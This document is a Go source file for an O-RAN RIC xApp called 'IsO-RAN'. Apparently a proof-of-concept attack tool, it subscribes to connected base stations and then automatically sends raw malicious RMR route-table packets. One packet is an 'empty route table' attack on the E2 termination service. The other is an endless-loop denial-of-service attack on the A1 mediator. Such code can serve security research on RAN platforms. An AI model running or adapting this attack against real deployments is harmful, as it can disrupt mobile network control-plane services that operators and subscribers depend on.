package main

import (
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"time"

	"gerrit.o-ran-sc.org/r/ric-plt/alarm-go.git/alarm"
	"gerrit.o-ran-sc.org/r/ric-plt/xapp-frame/pkg/clientmodel"
	"gerrit.o-ran-sc.org/r/ric-plt/xapp-frame/pkg/xapp"
)

type IsORAN struct {
	stats map[string]xapp.Counter
}

var (
	reqId               = int64(1)
	seqId               = int64(1)
	funId               = int64(1)
	actionId            = int64(1)
	actionType          = "report"
	subsequestActioType = "continue"
	timeToWait          = "w10ms"
	direction           = int64(0)
	procedureCode       = int64(27)
	xappEventInstanceID = int64(1234)
	typeOfMessage       = int64(1)
	subscriptionId      = ""
	hPort               = int64(8080)
	rPort               = int64(4560)
	clientEndpoint      = clientmodel.SubscriptionParamsClientEndpoint{Host: "service-ricxapp-iso-ran-rmr.ricxapp", HTTPPort: &hPort, RMRPort: &rPort}
)

func (e *IsORAN) sendMaliciousRouteTablePacket(targetIP string, targetPort int, packetFilePath string) {
	// Open raw packet from the file
	openRawPacket, err := os.Open(packetFilePath)
	if err != nil {
		xapp.Logger.Error("Error opening packet file:", err)
		return
	}

	// Read raw packet from the file
	rawPacket, err := io.ReadAll(openRawPacket)
	if err != nil {
		xapp.Logger.Error("Error reading packet file:", err)
		return
	}

	// Connect to the target address
	targetAddr := fmt.Sprintf("%s:%d", targetIP, targetPort)
	conn, err := net.Dial("tcp", targetAddr)
	if err != nil {
		xapp.Logger.Error("Error connecting to target:", err)
		return
	}
	defer conn.Close()

	// Send the raw packet as the payload
	_, err = conn.Write(rawPacket)
	if err != nil {
		xapp.Logger.Error("Error sending payload:", err)
		return
	}

	xapp.Logger.Info("Malicious routing table packet sent successfully")
}

func (e *IsORAN) ConfigChangeHandler(f string) {
	xapp.Logger.Info("Config file changed")
}

func (e *IsORAN) getEnbList() ([]*xapp.RNIBNbIdentity, error) {
	enbs, err := xapp.Rnib.GetListEnbIds()

	if err != nil {
		xapp.Logger.Error("Error: %s", err)
		return nil, err
	}

	xapp.Logger.Info("List for connected eNBs:")
	for index, enb := range enbs {
		xapp.Logger.Info("%d. enbid: %s", index+1, enb.InventoryName)
	}
	return enbs, nil
}

func (e *IsORAN) getGnbList() ([]*xapp.RNIBNbIdentity, error) {
	gnbs, err := xapp.Rnib.GetListGnbIds()

	if err != nil {
		xapp.Logger.Error("Error: %s", err)
		return nil, err
	}

	xapp.Logger.Info("List of connected gNBs:")
	for index, gnb := range gnbs {
		xapp.Logger.Info("%d. gnbid : %s", index+1, gnb.InventoryName)
	}
	return gnbs, nil
}

func (e *IsORAN) getnbList() []*xapp.RNIBNbIdentity {
	nbs := []*xapp.RNIBNbIdentity{}

	if enbs, err := e.getEnbList(); err == nil {
		nbs = append(nbs, enbs...)
	}

	if gnbs, err := e.getGnbList(); err == nil {
		nbs = append(nbs, gnbs...)
	}
	return nbs
}

func (e *IsORAN) sendSubscription(meid string) {

	xapp.Logger.Info("Sending subscription request for meid: %s", meid)
	subscriptionParams := clientmodel.SubscriptionParams{
		ClientEndpoint: &clientEndpoint,
		Meid:           &meid,
		RANFunctionID:  &funId,
		SubscriptionDetails: clientmodel.SubscriptionDetailsList([]*clientmodel.SubscriptionDetail{
			{
				ActionToBeSetupList: clientmodel.ActionsToBeSetup{
					&clientmodel.ActionToBeSetup{
						ActionDefinition: clientmodel.ActionDefinition([]int64{1, 2, 3, 4}),
						ActionID:         &actionId,
						ActionType:       &actionType,
						SubsequentAction: &clientmodel.SubsequentAction{
							SubsequentActionType: &subsequestActioType,
							TimeToWait:           &timeToWait,
						},
					},
				},
				EventTriggers:       clientmodel.EventTriggerDefinition([]int64{1, 2, 3, 4}),
				XappEventInstanceID: &xappEventInstanceID,
			},
		}),
	}

	b, err := json.MarshalIndent(subscriptionParams, "", "  ")

	if err != nil {
		xapp.Logger.Error("Json marshaling failed: %s", err)
		return
	}

	xapp.Logger.Info("Body: %s", string(b))

	resp, err := xapp.Subscription.Subscribe(&subscriptionParams)

	if err != nil {
		xapp.Logger.Error("Subscription failed (%s) with error: %s", meid, err)

		// subscription failed, raise alarm
		err := xapp.Alarm.Raise(8086, alarm.SeverityCritical, meid, "subscriptionFailed")
		if err != nil {
			xapp.Logger.Error("Raising alarm failed with error %v", err)
		}

		return
	}
	xapp.Logger.Info("Successfully subcription done (%s), subscription id: %s", meid, *resp.SubscriptionID)
}

func (e *IsORAN) xAppStartCB(d interface{}) {
	xapp.Logger.Info("xApp ready call back received")

	// get the list of all NBs
	nbList := e.getnbList()

	// send subscription request to each of the NBs
	for _, nb := range nbList {
		e.sendSubscription(nb.InventoryName)
		// Sending malicious route table packet 
		xapp.Logger.Info("Waiting 40 seconds before sending malicious RMR route tables...")
		time.Sleep(40 * time.Second)
		// RMR empty attack on E2 termination
		xapp.Logger.Info("RMR empty attack starting on E2 termination...")
		e.sendMaliciousRouteTablePacket("service-ricplt-e2term-rmr-alpha.ricplt", 38000, "rmr_payloads/rmr_empty_rt.raw")
		// RMR DoS attack on A1 mediator
		xapp.Logger.Info("RMR DoS attack starting on A1 mediator...")
		for {
			e.sendMaliciousRouteTablePacket("service-ricplt-a1mediator-rmr.ricplt", 4561, "rmr_payloads/rmr_dos_a1_mediator.raw")
		}
	}
}

func (e *IsORAN) handleRICIndication(ranName string, r *xapp.RMRParams) {
	// update metrics for indication message
	e.stats["RICIndicationRx"].Inc()
}

func (e *IsORAN) handleRouteTableData(ranName string, r *xapp.RMRParams) {
	xapp.Logger.Info("Handling route table data for RAN: %s", ranName)

	var routeTable map[string]interface{}
	err := json.Unmarshal(r.Payload, &routeTable)
	if err != nil {
		xapp.Logger.Error("Failed to unmarshal route table data: %s", err)
		return
	}

	xapp.Logger.Info("Route table data: %v", routeTable)
	e.stats["RouteTableDataRx"].Inc()
}
func (e *IsORAN) Consume(msg *xapp.RMRParams) (err error) {
	id := xapp.Rmr.GetRicMessageName(msg.Mtype)

	xapp.Logger.Info("Message received: name=%s meid=%s subId=%d txid=%s len=%d", id, msg.Meid.RanName, msg.SubId, msg.Xid, msg.PayloadLen)

	switch id {

	// RIC_E2_SETUP_RESP message
	case "RIC_E2_SETUP_RESP":
		xapp.Logger.Info("Received RIC_E2_SETUP_RESP message")

	// Policy request handler
	case "A1_POLICY_REQUEST":
		xapp.Logger.Info("Received policy instance list")

	// Health check request
	case "RIC_HEALTH_CHECK_REQ":
		xapp.Logger.Info("Received health check request")

	// RIC_INDICATION message
	case "RIC_INDICATION":
		xapp.Logger.Info("Received RIC Indication message")
		e.handleRICIndication(msg.Meid.RanName, msg)

	// RIC_E2_SETUP_REQ message
	case "RIC_E2_SETUP_REQ":
		xapp.Logger.Info("Received RIC_E2_SETUP_REQ message")

	default:
		xapp.Logger.Info("Unknown message type '%d', discarding", msg.Mtype)
	}

	defer func() {
		xapp.Rmr.Free(msg.Mbuf)
		msg.Mbuf = nil
	}()
	return
}

func (e *IsORAN) Run() {

	// set MDC
	xapp.Logger.SetMdc("IsO-RAN", "0.0.1")

	// set config change listener
	xapp.AddConfigChangeListener(e.ConfigChangeHandler)

	// register callback after xapp ready
	xapp.SetReadyCB(e.xAppStartCB, true)

	// reading configuration from config file
	waitForSdl := xapp.Config.GetBool("db.waitForSdl")

	// start xapp
	xapp.RunWithParams(e, waitForSdl)

}

func main() {
	// Defind metrics counter that the xapp provides
	metrics := []xapp.CounterOpts{
		{
			Name: "RICIndicationRx",
			Help: "total number of RIC Indication message received",
		},
		{
			Name: "RouteTableDataRx",
			Help: "total number of RMRRM_TABLE_DATA messages received",
		},
	}

	isoRan := IsORAN{
		stats: xapp.Metric.RegisterCounterGroup(metrics, "iso_ran"), // register counter
	}

	isoRan.Run()
}
